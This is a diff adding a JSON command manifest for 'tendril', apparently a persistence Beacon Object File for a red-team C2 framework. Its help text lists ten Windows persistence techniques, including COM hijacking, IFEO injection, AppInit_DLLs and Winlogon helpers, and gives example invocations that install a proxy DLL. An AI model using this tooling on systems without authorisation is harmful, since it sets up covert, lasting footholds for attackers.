@@ -1,0 +1,7 @@
+{
+  "alias": "tendril",
+  "format": "ssZZZ",
+  "help_short": "tendril <module_id> <action_id> <arg1> <arg2> <arg3>",
+  "help_long": "Tendril persistence BOF \u2014 unified dispatch.\nFormat: ssZZZ (two int16 IDs + three wide strings)\n\nModule IDs: 0=com_hijack 1=ghost_task 2=registry_run 3=screensaver\n            4=ifeo_inject 5=appinit_dlls 6=winlogon_helper 7=accessibility\n            8=netsh_helper 9=userinit_mpr\nAction IDs: 0=install 1=remove 2=check\n\nExamples:\n  inline_execute -BOF tendril.x64.o -Arguments \"0 0 C:\\proxy.dll {BCDE0395} Both\" -ArgumentTypes ssZZZ\n  inline_execute -BOF tendril.x64.o -Arguments \"1 2 \"\" \"\" \"\"\" -ArgumentTypes ssZZZ",
+  "thin": true
+}
